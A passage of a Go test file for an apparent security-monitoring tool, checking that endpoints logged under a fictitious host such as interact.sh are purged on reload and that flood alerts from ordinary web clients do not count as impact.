	s.surf.Endpoints["interact.sh /admin"] = &Endpoint{Host: "interact.sh", Path: "/admin", Methods: map[string]int{}, Status: map[int]int{200: 1}, atk: map[string]struct{}{}}
	s.surf.Findings["sens:interact.sh /admin"] = &Finding{ID: "sens:interact.sh /admin", Category: "敏感资源暴露"}
	s.mu.Unlock()
	path := filepath.Join(t.TempDir(), "state.json.gz")
	if err := s.Save(path); err != nil {
		t.Fatal(err)
	}
	r := newTestStore()
	if err := r.Load(path); err != nil {
		t.Fatal(err)
	}
	var hosts []string
	for _, kv := range r.Surface().Hosts {
		hosts = append(hosts, kv.Name)
	}
	if len(hosts) != 1 || hosts[0] != "mg.example.com" {
		t.Fatalf("虚构的站点不应列出: %v", hosts)
	}
	r.mu.RLock()
	defer r.mu.RUnlock()
	if r.surf.Findings["sens:interact.sh /admin"] != nil || r.surf.Endpoints["interact.sh /admin"] != nil {
		t.Fatal("旧版本按虚构 Host 登记的入口应删除")
	}
}

func weakHit(h model.Hit) model.Hit {
	h.Weak = true
	return h
}

func TestAssetChainWebClientFlood(t *testing.T) {
	s := newTestStore()
	now := time.Now().Add(-time.Hour)
	for i := range 80 {
		s.Record(&model.Event{Kind: model.KindWeb, SrcIP: "60.2.41.105", Host: "mg.example.com", Method: "GET", URI: fmt.Sprintf("/websocket/%d/x/websocket", i),
			Status: 200, Time: now}, nil)
	}
	s.Record(&model.Event{Kind: model.KindFirewall, SrcIP: "60.2.41.105", DstIP: "10.34.44.88", DstPort: 443, Proto: "tcp", Action: model.ActionAllow, Time: now},
		[]model.Hit{hit("bhv-flood", "洪水攻击", model.PhaseImpact, model.SevHigh, model.ResultAllowed)})
	s.Record(&model.Event{Kind: model.KindFirewall, SrcIP: "198.51.100.66", DstIP: "10.34.44.89", DstPort: 443, Proto: "tcp", Action: model.ActionAllow, Time: now},
		[]model.Hit{hit("bhv-flood", "洪水攻击", model.PhaseImpact, model.SevHigh, model.ResultAllowed)})
	if c := s.AssetChain("10.34.44.88"); c == nil || slices.Contains(c.Reached, "impact") || !slices.Contains(c.Weak, "impact") {
		t.Fatalf("正常 Web 客户端的“洪泛”不应推进到影响: %+v", c)
	}
	if c := s.AssetChain("10.34.44.89"); c == nil || !slices.Contains(c.Reached, "impact") {
		t.Fatalf("没有 Web 访问的来源打出的洪泛照常计入影响: %+v", c)
	}
}
